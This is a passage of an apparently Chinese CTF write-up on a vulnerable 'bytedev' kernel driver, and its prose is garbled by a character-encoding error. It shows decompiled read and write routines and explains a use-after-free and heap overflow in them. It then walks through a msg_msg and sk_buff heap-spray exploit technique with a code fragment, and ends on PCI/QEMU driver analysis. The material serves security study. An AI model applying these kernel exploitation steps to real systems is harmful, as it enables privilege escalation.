*chunk += remaining_size;</span><br><span class="line">            a3 -= remaining_size;</span><br><span class="line">            v10 += remaining_size;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            v31 = idx;</span><br><span class="line">            v18 = <span class="number">0xFFC</span>LL;</span><br><span class="line">            v19 = (_DWORD *)kmem_cache_alloc_trace(kmalloc_caches[<span class="number">26</span>], <span class="number">0x400CC0</span>LL, <span class="number">0x1000</span>LL);</span><br><span class="line">            *(_QWORD *)(v6 + <span class="number">8LL</span> * v31 + <span class="number">0x30</span>) = v19;</span><br><span class="line">            <span class="keyword">if</span> ( a3 &lt;= <span class="number">0xFFC</span> )</span><br><span class="line">              v18 = a3;</span><br><span class="line">            *(_DWORD *)(v6 + <span class="number">0xB4</span>) = (*(_DWORD *)(v6 + <span class="number">0xB4</span>) + <span class="number">1</span>) % <span class="number">16</span>;</span><br><span class="line">            *v19 = <span class="number">0</span>;</span><br><span class="line">            _check_object_size(v19 + <span class="number">1</span>, v18, <span class="number">0LL</span>);</span><br><span class="line">            <span class="keyword">if</span> ( copy_from_user(v19 + <span class="number">1</span>, user_buf, v18) )</span><br><span class="line">              <span class="keyword">return</span> ((__int64 (*)(<span class="keyword">void</span>))bytedev_write_cold_15)();</span><br><span class="line">            a3 -= v18;</span><br><span class="line">            *(_WORD *)v19 += v18;</span><br><span class="line">            v10 += v18;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> ( !a3 )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          idx = *(_DWORD *)(v6 + <span class="number">0xB4</span>);</span><br><span class="line">          read_idx = *(_DWORD *)(v6 + <span class="number">0xB0</span>);</span><br><span class="line">          v9 = idx + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  raw_spin_unlock(v32);</span><br><span class="line">  <span class="keyword">return</span> v10;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œwriteçš„åšæ³•è·Ÿreadç±»ä¼¼ï¼Œä¾æ—§å¯ä»¥åˆ†ä¸ºä¸¤ä¸ªéƒ¨åˆ†ã€‚é€šè¿‡æˆ‘ä¸Šé¢ä¿®æ”¹çš„å˜é‡åç§°å…¶å®ä¹Ÿå°±å¯ä»¥å¾ˆå¥½çš„æ¨æ–­å‡ºæ¥å®é™…çš„ç»“æ„äº†</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">ptr &#123;</span><br><span class="line"><span class="number">0xC8</span> : manager_object</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">manager_object &#123;</span><br><span class="line">(<span class="number">0x30</span> + idx * <span class="number">0x8</span>) : each_data</span><br><span class="line"><span class="number">0xB0</span> : read_idx</span><br><span class="line"><span class="number">0xB4</span> : write_idx</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">each_data &#123;</span><br><span class="line"><span class="number">0x0</span> : write_size</span><br><span class="line"><span class="number">0x2</span> : read_size</span><br><span class="line"><span class="number">0x4</span> â€” <span class="number">0xfff</span> : content</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¹Ÿå°±æ˜¯ç±»ä¼¼äºä¸Šè¿°è¿™æ ·çš„ç»“æ„ã€‚è¿™é‡Œçš„æ¼æ´ä¸»è¦å‘ç”Ÿäºreadä¸­ï¼Œå¯ä»¥çœ‹åˆ°åœ¨å·²ç»è¯»å–çš„sizeä¸º<code>0xffc</code>æ—¶åˆ™ä¼šfreeæ‰å“åº”çš„objectä½†æ˜¯ï¼Œå®é™…çš„æŒ‡é’ˆå¹¶æ²¡æœ‰è¢«æ¸…é™¤ï¼Œè¿™æ ·ä¹Ÿå°±é€ æˆäº†UAFã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">chunk = *(_WORD **)(v6 + <span class="number">8LL</span> * ((idx + <span class="number">0xF</span>) % <span class="number">16</span>) + <span class="number">0x30</span>);</span><br><span class="line">......</span><br><span class="line"><span class="keyword">if</span> ( chunk &amp;&amp; (write_offset = (<span class="keyword">unsigned</span> __int16)*chunk, (_WORD)write_offset != <span class="number">0xFFC</span>) )</span><br><span class="line">&#123;</span><br><span class="line">  ......</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">......</span><br><span class="line">  *(_DWORD *)(v6 + <span class="number">0xB4</span>) = (*(_DWORD *)(v6 + <span class="number">0xB4</span>) + <span class="number">1</span>) % <span class="number">16</span>;</span><br><span class="line">......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¹¶ä¸”åœ¨writeå‡½æ•°ä¸­è™½ç„¶åœ¨ç¬¬ä¸€æ¬¡å†™å…¥çš„æ—¶å€™ä¼šä¿®æ”¹<code>write_idx</code>ä¸º1ä½†æ˜¯åœ¨ç¬¬äºŒæ¬¡è°ƒç”¨çš„æ—¶å€™ä¼šåŠ ä¸Š<code>0xf</code>éšå³å’Œ16å–ä½™ï¼Œè€Œè¿™ä¹Ÿå°±ç­‰ä»·äºå¯¹<code>write_idx</code>å‡ä¸€çš„æ“ä½œï¼Œä¹Ÿå°±ä»¥ä¸ºç€æˆ‘ä»¬ä»ç„¶å¯ä»¥å¯¹åˆšåˆ›å»ºçš„objectè¿›è¡Œä½¿ç”¨ã€‚ä¸è¿‡å‰ææ˜¯è¿˜éœ€è¦ç»•è¿‡è¿™ä¸ªifè¯­å¥ï¼Œå½“ç„¶ç»•è¿‡çš„æ–¹å¼ä¹Ÿæ˜¯ååˆ†ç®€å•ï¼Œè¿™é‡Œä½¿ç”¨<code>sk_buff</code>è¿›è¡Œå †å–·å³å¯å¹¶ä¸”å¦‚æœ<code>write_size</code>æˆ‘ä»¬ä¿®æ”¹ä¸ºæ¯”<code>0xffc</code>å¤§çš„æ•°å­—è¿˜å¯é€ æˆå †æº¢å‡ºã€‚</p><h3 id="åˆ©ç”¨åˆ†æ"><a href="#åˆ©ç”¨åˆ†æ" class="headerlink" title="åˆ©ç”¨åˆ†æ"></a>åˆ©ç”¨åˆ†æ</h3><p>è¿™é‡Œçš„åˆ©ç”¨æ–¹å¼ä¾æ—§é‡‡ç”¨<a href="https://cv196082.gitee.io/2022/09/20/CVE-2021-22555%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95%E5%88%86%E6%9E%90/">CVE-2021-22555</a>è¿›è¡Œåˆ©ç”¨ï¼Œä¸ç†Ÿæ‚‰çš„æœ‹å‹å¯ä»¥å»æŸ¥çœ‹æˆ‘å…ˆå‰å¯¹è¿™ä¸€åˆ©ç”¨æ–¹æ³•çš„åˆ†æã€‚</p><p>å› ä¸ºåˆ©ç”¨æ–¹æ³•ä»¥å¾€å·²ç»åˆ†æè¿‡äº†æ‰€ä»¥è¿™é‡Œåªå¯¹å¦‚ä½•è¾¾åˆ°ä¸Šè¿°åˆ©ç”¨çš„æ¡ä»¶åšåˆ†æã€‚</p><p>è¿™é‡Œåˆä¸€æ¬¡ä¸å¾—ä¸æåˆ°ä¸€ä¸ªå¸¸ç”¨çš„ç»“æ„ä½“<code>msg_msg</code>äº†ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span></span><br><span class="line">    <span class="keyword">long</span> m_type;</span><br><span class="line">    <span class="keyword">size_t</span> m_ts;    <span class="comment">/* message text size */</span></span><br><span class="line">    <span class="keyword">void</span> *next;     <span class="comment">/* struct msg_msgseg *next; */</span></span><br><span class="line">    <span class="keyword">void</span> *security; <span class="comment">/* NULL without SELinux */</span></span><br><span class="line">    <span class="comment">/* the actual message follows immediately */</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">next</span>, *<span class="title">prev</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>ç„¶åå°±æ˜¯æˆ‘ä»¬ç†Ÿæ‚‰çš„å…³äº<code>msg_msg</code>å’Œ<code>msg_queue</code>ä¹‹é—´çš„ç»“æ„ä¸ºä¸€ä¸ªåŒå‘é“¾è¡¨ç»“æ„ï¼Œå¹¶ä¸”ç»“åˆlinuxæºç å¯ä»¥çœ‹åˆ°å¯»æ‰¾æ¶ˆæ¯çš„è¿‡ç¨‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct msg_msg *<span class="title">find_msg</span><span class="params">(struct msg_queue *msq, <span class="keyword">long</span> *msgtyp, <span class="keyword">int</span> mode)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">msg</span>, *<span class="title">found</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">long</span> count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">list_for_each_entry(msg, &amp;msq-&gt;q_messages, m_list) &#123;</span><br><span class="line"><span class="keyword">if</span> (testmsg(msg, *msgtyp, mode) &amp;&amp;</span><br><span class="line">    !security_msg_queue_msgrcv(&amp;msq-&gt;q_perm, msg, current,</span><br><span class="line">       *msgtyp, mode)) &#123;</span><br><span class="line"><span class="keyword">if</span> (mode == SEARCH_LESSEQUAL &amp;&amp; msg-&gt;m_type != <span class="number">1</span>) &#123;</span><br><span class="line">*msgtyp = msg-&gt;m_type - <span class="number">1</span>;</span><br><span class="line">found = msg;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (mode == SEARCH_NUMBER) &#123;</span><br><span class="line"><span class="keyword">if</span> (*msgtyp == count)</span><br><span class="line"><span class="keyword">return</span> msg;</span><br><span class="line">&#125; <span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> msg;</span><br><span class="line">count++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> found ?: ERR_PTR(-EAGAIN);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> list_for_each_entry(pos, head, member)\</span></span><br><span class="line"><span class="meta">for (pos = list_first_entry(head, typeof(*pos), member);\</span></span><br><span class="line"><span class="meta">     !list_entry_is_head(pos, head, member);\</span></span><br><span class="line"><span class="meta">     pos = list_next_entry(pos, member))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> list_first_entry(ptr, type, member) \</span></span><br><span class="line"><span class="meta">list_entry((ptr)-&gt;next, type, member)</span></span><br></pre></td></tr></table></figure><p><strong>å¯ä»¥å‘ç°ä½¿ç”¨nextæŒ‡é’ˆè¿›è¡Œå¯»æ‰¾çš„ï¼Œé‚£ä¹ˆæ ¹æ®åœ¨<code>vuln driver</code>ä¸­å­˜åœ¨çš„æ¼æ´å°±æ˜¯å †æº¢å‡ºï¼Œæ‰€ä»¥ç†æ‰€å½“ç„¶çš„å°±èƒ½å¤Ÿæƒ³åˆ°é€šè¿‡å †æº¢å‡ºä¿®æ”¹ç´§é‚»çš„<code>primary msg_msg</code>ç»“æ„ä½“çš„nextæŒ‡é’ˆæŒ‡å‘éšæœºä¸€ä¸ª<code>seconday msg_msg</code>å³å¯é€ æˆä¸¤ä¸ªæŒ‡é’ˆæŒ‡å‘é€šè¿‡ä¸€ä¸ªobjectçš„æƒ…å†µã€‚é‚£ä¹ˆå¦‚æœæˆ‘ä»¬è¿™æ—¶é€šè¿‡åŸæœ¬æŒ‡å‘çš„<code>secondary msg_msg</code>çš„<code>primary msg_msg</code>çš„<code>msg_queue</code>è¿›è¡Œç´¢å¼•å»<code>msgrcv</code>çš„è¯å³å¯é‡Šæ”¾æ‰<code>secondary msg_msg</code>ï¼Œä½†æ˜¯è¿˜å­˜åœ¨ä¸€ä¸ªè¢«å †æº¢å‡ºä¿®æ”¹çš„<code>primary msg_msg</code>çš„nextæŒ‡é’ˆä¾æ—§æŒ‡å‘<code>secondary msg_msg</code>é‚£ä¹ˆæˆ‘ä»¬ä»ç„¶å¯ä»¥é€šè¿‡è¢«ç ´åçš„<code>primary msg_msg</code>å»ç´¢å¼•åˆ°å·²ç»è¢«freeæ‰çš„<code>secondary msg_msg</code>ã€‚è¿™ä¹Ÿå°±é€ æˆäº†æˆ‘ä»¬æ‰€æœŸç›¼çš„UAFäº†ã€‚</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i++)</span><br><span class="line">&#123;</span><br><span class="line">  *(<span class="keyword">int</span> *)&amp;primary_msg.mtext[<span class="number">0</span>] = MSG_TAG;</span><br><span class="line">  *(<span class="keyword">int</span> *)&amp;primary_msg.mtext[<span class="number">4</span>] = i;</span><br><span class="line">  <span class="keyword">if</span> (msgsnd(msqid[i], &amp;primary_msg,</span><br><span class="line">             <span class="keyword">sizeof</span>(primary_msg) - <span class="number">8</span>, <span class="number">0</span>) &lt; <span class="number">0</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    errExit(<span class="string">&quot;failed to send primary msg!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  *(<span class="keyword">int</span> *)&amp;secondary_msg.mtext[<span class="number">0</span>] = MSG_TAG;</span><br><span class="line">  *(<span class="keyword">int</span> *)&amp;secondary_msg.mtext[<span class="number">4</span>] = i;</span><br><span class="line">  <span class="keyword">if</span> (msgsnd(msqid[i], &amp;secondary_msg,</span><br><span class="line">             <span class="keyword">sizeof</span>(secondary_msg) - <span class="number">8</span>, <span class="number">0</span>) &lt; <span class="number">0</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    errExit(<span class="string">&quot;failed to send secondary msg!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i += <span class="number">1024</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (msgrcv(msqid[i], &amp;primary_msg, <span class="keyword">sizeof</span>(primary_msg) - <span class="number">8</span>, PRIMARY_MSG_TYPE, <span class="number">0</span>) &lt; <span class="number">0</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    errExit(<span class="string">&quot;failed to receive primary msg!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">memset</span>(buf, <span class="number">0x84</span>, <span class="number">0x1000</span>);</span><br><span class="line">write(fd, buf, <span class="number">0xffc</span>);</span><br><span class="line">read(fd, buf, <span class="number">0xffc</span>);</span><br><span class="line"><span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x1000</span>);</span><br><span class="line">*(<span class="keyword">unsigned</span> <span class="keyword">short</span> *)buf = <span class="number">0xffd</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> (write(sk_sockets[i][<span class="number">0</span>], buf, <span class="number">0x1000</span> - <span class="number">0x140</span>) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">memset</span>(buf, <span class="number">0xa0</span>, <span class="number">0x1000</span>);</span><br><span class="line">write(fd, buf, <span class="number">1</span>);</span><br></pre></td></tr></table></figure><p>ä¸Šè¿°ä»£ç å°±æ˜¯äº§ç”Ÿæ¼æ´åˆ©ç”¨æ¡ä»¶çš„æ”»å‡»ä»£ç ç‰‡æ®µã€‚</p><h2 id="QEMUåˆ†æ"><a href="#QEMUåˆ†æ" class="headerlink" title="QEMUåˆ†æ"></a>QEMUåˆ†æ</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pci_driver</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">node</span>;</span></span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">char</span> *name;</span><br><span class="line">        <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pci_device_id</span> *<span class="title">id_table</span>;</span> </span><br><span class="line">        <span class="keyword">int</span>  (*probe)  (struct pci_dev *dev, <span class="keyword">const</span> struct pci_device_id *id);   <span class="comment">/* New device inserted */</span></span><br><span class="line">        <span class="keyword">void</span> (*remove) (struct pci_dev *dev);   <span class="comment">/* Device removed (NULL if not a hot-plug capable driver) */</span></span><br><span class="line">        <span class="keyword">int</span>  (*suspend) (struct pci_dev *dev, <span class="keyword">pm_message_t</span> state);      <span class="comment">/* Device suspended */</span></span><br><span class="line">        <span class="keyword">int</span>  (*suspend_late) (struct pci_dev *dev, <span class="keyword">pm_message_t</span> state);</span><br><span class="line">        <span class="keyword">int</span>  (*resume_early) (struct pci_dev *dev);</span><br><span class="line">        <span class="keyword">int</span>  (*resume) (struct pci_dev *dev);                   <span class="comment">/* Device woken up */</span></span><br><span class="line">        <span class="keyword">void</span> (*shutdown) (struct pci_dev *dev);</span><br><span class="line">        <span class="keyword">int</span> (*sriov_configure) (struct pci_dev *dev, <span class="keyword">int</span> num_vfs); <span class="comment">/* PF pdev */</span></span><br><span class="line">        <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pci_error_handlers</span> *<span class="title">err_handler</span>;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">device_driver</span>    <span class="title">driver</span>;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pci_dynids</span> <span class="title">dynids</span>;</span></span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆä½¿ç”¨<code>_pci_register_driver</code>å‡½æ•°æ³¨å†Œä¸€ä¸ªè®¾å¤‡é©±åŠ¨ï¼Œä¸Šè¿°å°±æ˜¯å¯¹åº”çš„ç»“æ„ä½“</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">.data:0000000000001E00 00                            bytedev_driver db    0                  ; DATA XREF: init_module+132â†‘o</span><br><span class="line">.data:0000000000001E00                                                                       ; cleanup_module+2Bâ†‘o</span><br><span class="line">.data:0000000000001E01 00                            db    0</span><br><span class="line">.data:0000000000001E02 00                            db    0</span><br><span class="line">.data:0000000000001E03 00                            db    0</span><br><span class="line">.data:0000000000001E04 00                            db    0</span><br><span class="line">.data:0000000000001E05 00                            db    0</span><br><span class="line">.data:0000000000001E06 00                            db    0</span><br><span class="line">.data:0000000000001E07 00                            db    0</span><br><span class="line">.data:0000000000001E08 00                            db    0</span><br><span class="line">.data:0000000000001E09 00                            db    0</span><br><span class="line">.data:0000000000001E0A 00                            db    0</span><br><span class="line">.data:0000000000001E0B 00                            db    0</span><br><span class="line">.data:0000000000001E0C 00                            db    0</span><br><span class="line">.data:0000000000001E0D 00                            db    0</span><br><span class="line">.data:0000000000001E0E 00                            db    0</span><br><span class="line">.data:0000000000001E0F 00                            db    0</span><br><span class="line">.data:0000000000001E10 03 0C 00 00 00 00 00 00       dq offset aBytedev                      ; &quot;bytedev&quot;</span><br><span class="line">.data:0000000000001E18 00 13 00 00 00 00 00 00       dq offset bytedev_ids</span><br><span class="line">.data:0000000000001E20 95 06 00 00 00 00 00 00       dq offset bytedev_pci_probe</span><br><span class="line">.data:0000000000001E28 C0 00 00 00 00 00 00 00       dq offset bytedev_pci_remove</span><br></pre></td></tr></table></figure><p>åœ¨å†…å­˜ä¸­å°±æ˜¯è¿™æ ·ï¼Œåœ¨æ³¨å†Œå‡½æ•°ä¸­ä¼šè°ƒç”¨<code>bytedev_pci_probe</code>å‡½æ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">bytedev_pci_probe</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v1; <span class="comment">// r13d</span></span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  __int64 v4; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v5; <span class="comment">// rax</span></span><br><span class="line">  __int64 i; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v7; <span class="comment">// r12d</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v8; <span class="comment">// rax</span></span><br><span class="line">  __int64 v9; <span class="comment">// rcx</span></span><br><span class="line">  _DWORD *v10; <span class="comment">// rdi</span></span><br><span class="line">  __int64 v12[<span class="number">14</span>]; <span class="comment">// [rsp+0h] [rbp-70h] BYREF</span></span><br><span class="line"></span><br><span class="line">  _fentry__();</span><br><span class="line">  v1 = <span class="number">-12</span>;</span><br><span class="line">  v12[<span class="number">8</span>] = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  printk(&amp;unk_DC8);</span><br><span class="line">  v3 = kmem_cache_alloc_trace(kmalloc_caches[<span class="number">2</span>], <span class="number">0xDC0</span>LL, <span class="number">0xB8</span>LL);</span><br><span class="line">  <span class="keyword">if</span> ( v3 )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_QWORD *)(a1 + <span class="number">0x148</span>) = v3;</span><br><span class="line">    v4 = v3;</span><br><span class="line">    v1 = pci_enable_device(a1);</span><br><span class="line">    <span class="keyword">if</span> ( v1 )</span><br><span class="line">    &#123;</span><br><span class="line">      printk(&amp;unk_DF8);</span><br><span class="line">LABEL_31:</span><br><span class="line">      kfree(v4);</span><br><span class="line">      <span class="keyword">return</span> v1;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( (*(_BYTE *)(a1 + <span class="number">0x3D1</span>) &amp; <span class="number">2</span>) == <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v1 = <span class="number">-19</span>;</span><br><span class="line">      printk(&amp;unk_E28);</span><br><span class="line">LABEL_30:</span><br><span class="line">      pci_disable_device(a1);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_31;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( (*(_BYTE *)(a1 + <span class="number">0x411</span>) &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v1 = <span class="number">-19</span>;</span><br><span class="line">      printk(&amp;unk_E70);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_30;</span><br><span class="line">    &#125;</span><br><span class="line">    v1 = pci_request_regions(a1, <span class="string">&quot;ByteDance-CTFDevice&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v1 )</span><br><span class="line">    &#123;</span><br><span class="line">      printk(&amp;unk_EB8);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_30;</span><br><span class="line">    &#125;</span><br><span class="line">    v5 = pci_ioremap_bar(a1, <span 